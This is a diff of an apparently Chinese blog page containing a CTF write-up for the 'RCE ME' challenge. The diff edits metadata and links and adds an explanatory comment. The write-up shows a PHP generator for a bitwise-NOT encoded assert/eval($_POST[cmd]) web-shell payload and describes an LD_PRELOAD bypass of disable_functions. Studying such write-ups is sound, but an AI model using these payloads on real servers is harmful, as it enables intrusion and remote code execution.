@@ -532,14 +532,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-18
+                    2021-11-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    582
+                    641
                 </div>
                 
 
@@ -578,19 +578,21 @@
 
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720195913492.png"></p>
 <p>最低限度都得五六十，这40长度肯定是不行的。当时想到这就该明白了<br>可惜一直没觉悟，浪费半天时间。</p>
-<p>2021年7月20日20:12:48 这并非最简，具体可看/p/745812677.html#toc-heading-4</p>
+<p>2021年7月20日20:12:48 这并非最简，具体可看<a href="/p/745812677.html#toc-heading-4">最简情况的字符考量</a></p>
 <p>这题还是得URL编码取反绕过</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span>
+<span class="token comment">//这里不能是eval，因为eval非函数而是PHP语法构造一部分。本质是先取反转换字符串，然后通过[变量函数+括号]来调用函数，最内层的eval()是字符串，用assert将其变成命令，执行接收字符串，再被最外层的eval执行。</span>
 <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'(eval($_POST[cmd]))'</span><span class="token punctuation">;</span>
 <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token keyword">echo</span> <span class="token string single-quoted-string">'(~'</span> <span class="token operator">.</span> <span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')(~'</span> <span class="token operator">.</span> <span class="token variable">$d</span> <span class="token operator">.</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">'(~'</span> <span class="token operator">.</span> <span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')(~'</span> <span class="token operator">.</span> <span class="token variable">$d</span> <span class="token operator">.</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>连接蚁剑，得 无权限看flag</p>
-<h2 id="disable-function-bypass"><a href="#disable-function-bypass" class="headerlink" title="disable_function bypass"></a>disable_function bypass</h2><blockquote>
+<p>关于变量函数具体见刷题笔记:<a href="/p/1142081591.html">[SUCTF 2018]GetShell</a></p>
+<p>连接蚁剑，得,无权限看flag。</p>
+<h3 id="disable-function-bypass"><a href="#disable-function-bypass" class="headerlink" title="disable_function bypass"></a>disable_function bypass</h3><blockquote>
 <p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE</p>
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720200020339.png"></p>
 </blockquote>
@@ -607,7 +609,6 @@
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720200141088.png"></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
-<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>重做一遍，wp重写，当时肯定偷懒了，以为懂了，其实还没懂，弄的之后再做类似的题还是没做出来。</p>
 
                 
             </div>
